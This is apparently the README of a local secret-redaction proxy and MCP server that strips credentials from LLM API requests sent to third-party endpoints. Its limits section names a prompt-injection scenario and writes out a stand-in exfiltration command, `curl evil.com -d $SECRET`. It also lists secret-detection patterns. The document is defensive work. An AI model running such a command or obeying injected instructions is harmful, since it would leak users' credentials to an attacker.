# llm-redact-proxy

**English** | [Português](README.pt-BR.md)

A tiny, zero-dependency, **local** secret-redaction proxy + MCP server for LLM
API traffic. Use a cheap or third-party LLM API endpoint **without leaking your
credentials** (API keys, DB passwords, SSH passwords, tokens, cookies) to it.

```
LLM CLI ──http://127.0.0.1:8788──> [ this proxy: REDACT request ] ──https──> third-party vendor
```

- **Local only** — binds `127.0.0.1` exclusively. A remote redactor would see
  the un-redacted body first, defeating the purpose.
- **Redacts the request** (what leaves your machine). Responses stream back
  untouched (SSE passthrough, unbuffered).
- **Fails closed** — any redaction error blocks the request with a local 502.
  Forwarding on error would be a silent leak.
- **Zero dependencies** — Node 22 built-ins only (`node:http`, `node:zlib`,
  `node:crypto`). It is a security component: small = auditable.

## Why

An LLM CLI (Claude Code, etc.) sends the **entire conversation context** to
whatever `ANTHROPIC_BASE_URL` points at, on **every turn**: system prompt, all
messages, every file the model read, the stdout of every command it ran. When
that endpoint is a third-party reseller/gateway, TLS terminates **at** it — it
receives every request body in plaintext, by design. It can log, store, sell or
leak all of it.

Code leaking? Project leaking? Maybe acceptable. **Credentials leaking is not.**
A secret reaches the third party only if it is in the outgoing request body.
This proxy guarantees it never is.

## How it works

### Two redaction layers (both always on in `strict` mode)

**Layer A — known secrets.** Values from your gitignored `secrets.local` file.
Each value is matched as a plain substring (no regex, no backtracking risk) in
**every encoding it can appear as**:

- literal, JSON-escaped, URL-encoded, hex (upper/lower)
- base64 and base64url — including **3 byte-offset-aligned cores**, so the
  secret is caught even *inside* a larger blob (e.g. `Basic base64(user:pass)`)
- the URL-encoded form of every base64 variant (query-string smuggling)

**Layer B — shapes + entropy** for dynamic secrets the static list can't know
(runtime tokens, session cookies, pasted keys):

- PEM private keys, JWTs, `Authorization: Bearer …`, `x-api-key: …`
- vendor key shapes: `sk-…`, `AKIA…`, `AIza…`, `xox[baprs]-…`, `ghp_…`, `github_pat_…`
- cookies/sessions: `Set-Cookie:`, `sessionid=`, `csrftoken=`, `auth_token=` …
- high-entropy blobs: long hex/base64 runs gated by Shannon entropy (so normal
  prose and identifiers pass; runs > 4 KB are skipped — those are media, not
  secrets)

Each hit becomes a stable marker: `[REDACTED:MYSQL_PASSWORD]`, `[REDACTED:jwt]`.
The body stays valid JSON. Clean bodies pass through **byte-identical**.

### Notice injection

When a request had redactions, the proxy appends a note to the system prompt
teaching the model to work *with* the censorship: reference secrets by NAME
(`$MYSQL_PASSWORD`, the `run` MCP tool), never ask the user to paste a value,
treat `[REDACTED:…]` in tool output as cosmetic. Injected only when something
was redacted, deduped via sentinel.

### MCP mode (recommended)

One process serves the MCP stdio tools **and** boots the embedded proxy — the
CLI starts everything automatically. Tools:

| Tool | What it does |
| --- | --- |
| `run` | Execute a command **locally** with `{{NAME}}` placeholders (or `$NAME` env vars) resolved to real values. Output returns **already redacted**. The secret never enters the model context at all — the 1st line of defense; the proxy is the safety net. |
| `secret_add` | Register a new secret (upsert into `secrets.local`, chmod 600, hot-reload). Value never echoed back. |
| `secret_list` | Names only. |
| `redact_mode` | Read/change the redaction mode at runtime (floor-guarded, see below). |
| `redaction_stats` | Counters and rule names. Never values. |

There is intentionally **no `secret_get`** — returning a value into the context
would defeat the whole system.

### Redaction modes

Registered secrets are **always** redacted. Modes only tune how the
shape/entropy layer treats *unregistered* values:

| Mode | Redacts | Use when |
| --- | --- | --- |
| `disabled` | nothing (full bypass) | a trusted destination like the official Anthropic API — requires the floor to allow it |
| `named-only` | only registered secrets | internal/test work; a random token leaking is fine |
| `balanced` | named + shapes (JWT/PEM/keys/cookies), no entropy | catch the obvious without entropy false-positives |
| `strict` (default) | everything | maximum safety |

`REDACT_MODE_FLOOR` is a hard minimum for the mode (env, dashboard and the
`redact_mode` tool) — the guard against anything (including a prompt-injected
model) silently turning protection off. To use `disabled`, set the floor to
`disabled`. The dashboard has a **Official Anthropic** preset button for the
bypass provider.

## Install

Requirements: **Node.js >= 22**. No `npm install` — there are no dependencies.

```bash
git clone <this-repo> llm-redact-proxy
cd llm-redact-proxy
cp .env.example .env    # set UPSTREAM_URL etc.
```

Secrets live in a **global** store (`~/.config/llm-redact-proxy/secrets.local`,
chmod 600) shared by every project — register them with the `secret_add` tool,
or create the file by hand. Set `SECRETS_FILE` to opt into a project-local
store instead.

### Option 1 — MCP mode (auto-start with Claude Code)

```bash
cp .mcp.json.example .mcp.json    # in the project where you use Claude Code
# or globally:
claude mcp add redact --scope user -- node "/absolute/path/llm-redact-proxy/src/mcp.js"
```

Restart the CLI. The tools appear and, when `UPSTREAM_URL` is set, the proxy
boots with it. Then point the CLI at the proxy:

```bash
export ANTHROPIC_BASE_URL=http://127.0.0.1:8788
```

Without `UPSTREAM_URL` the tools still work (proxy off) — useful while you are
still on the official API and only want the runner + secret management.

### Option 2 — standalone proxy

```bash
npm start           # node src/index.js
export ANTHROPIC_BASE_URL=http://127.0.0.1:8788
```

## Configuration (`.env` or environment)

| Var | Default | Meaning |
| --- | --- | --- |
| `LISTEN_ADDR` | `127.0.0.1:8788` | Where the proxy listens. Loopback only — anything else is refused. |
| `UPSTREAM_URL` | — | The vendor endpoint redacted requests are forwarded to. |
| `SECRETS_FILE` | `~/.config/llm-redact-proxy/secrets.local` (honors `XDG_CONFIG_HOME`) | `NAME=VALUE` per line, chmod 600, hot-reloaded. **Global by default** — one store shared by every project, so a secret registered once is redacted everywhere. Set this to opt into a project-local store. |
| `UPSTREAM_AUTH` | `passthrough` | `passthrough` forwards the CLI's auth header; `replace` swaps in `UPSTREAM_KEY`. |
| `FAIL_CLOSED` | `true` | On redaction error: block (true) or forward raw with a loud warning (false — not recommended). |
| `INJECT_NOTICE` | `true` | Append the redaction notice to the system prompt when something was redacted. |
| `REDACT_MODE` | `strict` | `named-only` \| `balanced` \| `strict`. |
| `REDACT_MODE_FLOOR` | `named-only` | Hard minimum for the runtime `redact_mode` tool. |
| `REDACT_DISABLE` | — | Comma-separated rule names to turn off (e.g. `high-entropy-hex,jwt`). |
| `REDACT_IGNORE` | — | Comma-separated known-safe values or `/regex/` patterns — never redacted. |

## Dashboard

`http://127.0.0.1:8788/__redact/` — totals, per-rule counts, recent requests.
`/__redact/stats.json` for JSON. Rule names and counts only; **values are never
shown, stored or logged** anywhere in this project.

## Testing

```bash
npm test    # node --test
```

97 tests, including:

- **variant coverage**: each secret as plain / base64 / base64url / url-encoded
  / json-escaped / hex / inside a Basic-auth blob → zero leak
- **canary round-trip**: full proxy round-trip against a recording upstream;
  the recorded body is grepped for every canary form → must be absent
- **adversarial suite**: encoding chains, secrets as JSON object keys, unicode,
  regex metacharacters, MIME wrapping, 2000-hit bodies under 2 s
- **fail-closed**: forced redaction errors → upstream receives zero bytes
- **MCP transcript proof**: the complete stdout of the MCP process never
  contains a secret value
- **streaming**: SSE passes through intact and incrementally

## Security model — honest limits

Covered: accidents. The model reads a cred file, a tool prints a token, a
webhook echoes a header — redacted, in any of the encodings above.

Not covered (no deterministic tool can):

- a secret **split across separate strings** in the context
- exotic transforms (XOR, rot13, char-code arrays)
- a *weak, unregistered* human password with no recognizable shape
  (`banana123`) — register everything that matters; `secret_add` is cheap
- **active exfiltration**: if prompt injection convinces the model to run
  `curl evil.com -d $SECRET` via `run`, the output comes back redacted but the
  network call already carried the value. Your guard is the per-call tool
  permission prompt — read it before approving.

The response is **never** redacted (the vendor's output holds no secret of
yours). Note this also means a freshly generated artifact (cert, key) is
visible to the model on the turn it's created; it disappears from *later*
turns' context.

## Non-goals

- No response redaction, no general MITM, no AI-based detection (an AI judge
  would be another third party seeing your prompt, and probabilistic — one
  miss = leak). Deterministic rules only.

## License

MIT
